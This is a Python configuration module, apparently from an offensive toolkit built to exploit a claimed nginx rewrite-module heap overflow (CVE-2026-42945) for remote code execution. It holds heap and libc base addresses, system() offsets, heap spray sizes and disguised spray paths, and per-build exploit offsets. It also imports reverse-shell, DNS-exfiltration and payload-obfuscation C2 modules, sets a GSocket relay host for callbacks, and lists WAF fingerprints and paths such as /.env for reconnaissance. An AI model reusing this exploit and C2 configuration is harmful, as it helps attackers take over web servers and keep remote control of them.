"""
config.py — All constants for the NGINX Rift Super Toolkit package.
No imports from other package modules to avoid circular dependencies.
"""
from __future__ import annotations

from collections import OrderedDict

# ─── Version & Banner ─────────────────────────────────────────────────────────
VERSION = "2.1.0"
BANNER = r"""
   ╔══════════════════════════════════════════════════════╗
   ║       NGINX Rift — CVE-2026-42945 Super Toolkit     ║
   ║       Heap Overflow → RCE  |  v""" + VERSION + r"""               ║
   ╚══════════════════════════════════════════════════════╝
"""

# ─── Global runtime flags ─────────────────────────────────────────────────────
_KILL_PORT = True    # set to False via --no-kill-port

# ─── C2 availability flag (set at import time by trying optional imports) ─────
try:
    from c2_methods import C2Registry, C2Method, TCPReverseShell, HTTPCallback, DNSExfiltration, WebSocketCallback  # noqa
    from c2_fallback import C2FallbackChain, C2MethodAnalyzer  # noqa
    from c2_obfuscator import PayloadObfuscator, ObfuscationProfile  # noqa
    from c2_verifier import CommandVerifier, ExecutionTracker, FailureDetection  # noqa
    _C2_AVAILABLE = True
except ImportError:
    _C2_AVAILABLE = False

# ─── URI-safe byte table (NGX_ESCAPE_ARGS bitmask) ───────────────────────────
_URI_UNSAFE = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
               0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
SAFE_URI_BYTES = {b for b in range(256)
                  if not (_URI_UNSAFE[b >> 5] & (1 << (b & 0x1f)))}

# ─── Lab defaults (Ubuntu 22.04, glibc 2.35, nginx commit 98fc3bb78, ASLR off) ─
DEFAULT_HEAP_BASE    = 0x555555659000
DEFAULT_LIBC_BASE    = 0x7ffff77ba000
DEFAULT_SYSTEM_OFFSET = 0x50d70

DEFAULT_HEAP_OFFSETS = [
    0x05a427, 0x060e67,
    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
    0x103847, 0x108657, 0x10d467,
]

# ─── 32-bit defaults (dinosn) ─────────────────────────────────────────────────
DEFAULT_SYSTEM_OFF_32         = 0x410F0
DEFAULT_SPRAY_INTERNAL_OFF_32 = 0x11438
DEFAULT_HEAP_PAGE_MIN         = 0x56700
DEFAULT_HEAP_PAGE_MAX         = 0x58700
DEFAULT_LIBC_PAGE_MIN         = 0xF7840
DEFAULT_LIBC_PAGE_MAX         = 0xF7960
DEFAULT_N_PLUS_32             = 1841

# ─── Spray parameters ─────────────────────────────────────────────────────────
BODY_LEN    = 4000
N_SPRAY     = 20
DEFAULT_PORT = 19321
DEFAULT_SPRAY_PATH = "/spray"
PAD_A       = 349
PAD_PLUS    = 969
# How many bytes after the spray pointer the command string starts.
# Matches struct.pack('<QQQ', system_addr, data_addr, 0) → 24 bytes header.
DATA_ADDR_OFFSET = 24

# ─── CVE database (from MateusVerass) ─────────────────────────────────────────
CVE_DB = OrderedDict([
    ("CVE-2026-42945", {"cvss": 9.8, "vuln_min": "0.6.27", "vuln_max": "1.30.0",
                        "patched": "1.30.1", "desc": "NGINX Rift — heap overflow in rewrite module"}),
    ("CVE-2025-23458", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.3",
                        "patched": "1.27.4", "desc": "Heap buffer overflow in HTTP/3"}),
    ("CVE-2024-73445", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.2",
                        "patched": "1.27.3", "desc": "Heap buffer overflow in QUIC"}),
    ("CVE-2024-32760", {"cvss": 7.5, "vuln_max": "1.26.2", "patched": "1.26.3",
                        "desc": "MP4 module memory leak"}),
    ("CVE-2024-31079", {"cvss": 5.3, "vuln_max": "1.26.2", "patched": "1.26.3",
                        "desc": "HTTP/2 memory overhead"}),
    ("CVE-2024-24989", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
                        "desc": "HTTP/2 request splitting"}),
    ("CVE-2024-24990", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
                        "desc": "HTTP/2 memory disclosure"}),
    ("CVE-2024-35200", {"cvss": 6.5, "vuln_min": "1.25.3", "vuln_max": "1.27.0",
                        "patched": "1.27.1", "desc": "HTTP/2 error page info leak"}),
    ("CVE-2023-44487", {"cvss": 7.5, "desc": "HTTP/2 rapid reset (protocol-level)"}),
    ("CVE-2021-23017", {"cvss": 7.5, "vuln_max": "1.21.0", "patched": "1.21.1",
                        "desc": "DNS resolver use-after-free"}),
])

# ─── Known build offsets ──────────────────────────────────────────────────────
KNOWN_BUILDS = {
    "1.25.3-glibc": {
        "heap_base": 0x555555659000, "libc_base": 0x7ffff77ba000,
        "sys_offset": 0x50d70, "offsets": DEFAULT_HEAP_OFFSETS,
    },
    "1.30.0-glibc": {
        "heap_base": 0x55555566f000, "libc_base": 0x7ffff77b8000,
        "sys_offset": 0x50d70, "offsets": [0x44427, 0xa3147, 0xa7f57],
    },
    "_default": {
        "heap_base": DEFAULT_HEAP_BASE, "libc_base": DEFAULT_LIBC_BASE,
        "sys_offset": DEFAULT_SYSTEM_OFFSET, "offsets": DEFAULT_HEAP_OFFSETS,
    },
}

# ─── WAF signatures ───────────────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["cf-ray", "__cfduid"], "body": ["cloudflare"]},
    "AWS WAF":    {"headers": ["x-amzn-requestid", "x-amzn-trace-id"], "body": []},
    "ModSecurity": {"headers": [], "body": ["mod_security", "modsecurity"]},
    "F5 BIG-IP":  {"headers": ["x-application-context", "x-request-id"], "body": []},
}

# ─── Security header list ─────────────────────────────────────────────────────
SECURITY_HEADERS = [
    ("Strict-Transport-Security", "HSTS"),
    ("Content-Security-Policy", "CSP"),
    ("X-Frame-Options", "Clickjacking protection"),
    ("X-Content-Type-Options", "MIME-sniffing protection"),
    ("Referrer-Policy", "Referrer control"),
    ("Permissions-Policy", "Permissions control"),
]

# ─── Discovery lists ──────────────────────────────────────────────────────────
COMMON_SUBDOMAINS = [
    "www", "mail", "admin", "api", "cdn", "static", "assets",
    "img", "css", "js", "portal", "vpn", "remote", "git",
    "jenkins", "grafana", "prometheus", "kibana", "webmail",
]

INTERESTING_PATHS = [
    "/admin", "/api", "/config", "/backup", "/.env", "/.git/config",
    "/wp-admin", "/nginx_status", "/status", "/health", "/metrics",
]

# ─── GSocket / GSRN relay ─────────────────────────────────────────────────────
GSRN_HOST = "gs.gsocket.io"
GSRN_PORT = 7350
_GS_VER    = 0x03
_GS_LISTEN = 0x02   # register as listener
_GS_CONN   = 0x01   # connect to a listener
GSRN_RELAY_CANDIDATES: list[tuple[str, int]] = [
    ("gs.gsocket.io", 7350),
    ("gsocket.io",    7350),
]

# ─── Realistic spray paths ────────────────────────────────────────────────────
REALISTIC_SPRAY_PATHS = [
    "/spray",
    "/upload", "/api/upload", "/api/v1/upload", "/api/v2/upload",
    "/api/import", "/api/data", "/api/bulk", "/api/batch",
    "/submit", "/post", "/form", "/api/form",
    "/profile", "/avatar", "/api/user/avatar",
    "/api/webhook", "/api/callback", "/webhook",
    "/proxy", "/gateway", "/api/proxy",
    "/api/v1/import", "/api/v2/import",
    "/cgi-bin", "/cgi-bin/upload",
    "/phpmyadmin/import.php",
]
